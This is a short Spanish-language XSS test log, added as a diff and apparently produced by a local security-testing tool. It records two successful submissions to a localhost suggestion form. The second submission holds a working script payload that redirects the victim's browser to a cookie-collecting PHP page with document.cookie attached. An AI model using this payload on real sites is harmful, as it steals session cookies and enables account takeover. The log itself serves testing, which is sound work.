@@ -1,0 +1,24 @@
+DETALLES DE LA PRUEBA DE INYECCIÓN XSS.
+
+
+Fecha y Hora de Creación: 19/05/2016 03:07:22 PM
+Usuario: MIGUEL (Evaluador)
+
+URL Destino del Formulario: http://localhost/sirah/enviar-sugerencia
+Mensaje de Respuesta Invalido: Complete los campos obligatorios
+
+INTENTOS: 
+
+1 => Exitoso: [comentario=﻿﻿archivo] [email=por defecto] [submit=Enviar] 
+
+2 => Exitoso: [comentario=<script> function getCookie() { return location.href="http://localhost/sisec/cookies/xss/substraerCookies.php/?cookie="%2Bdocument.cookie; } getCookie(); </script>] [email=substraercookies@mail.com] [submit=Enviar] 
+
+
+
+TOTAL DE INTENTOS: 2
+INTENTOS EXITOSOS: 2 (1,2)
+INTENTOS FALLIDOS: 0
+
+0.4414
+
+RESULTADOS: 
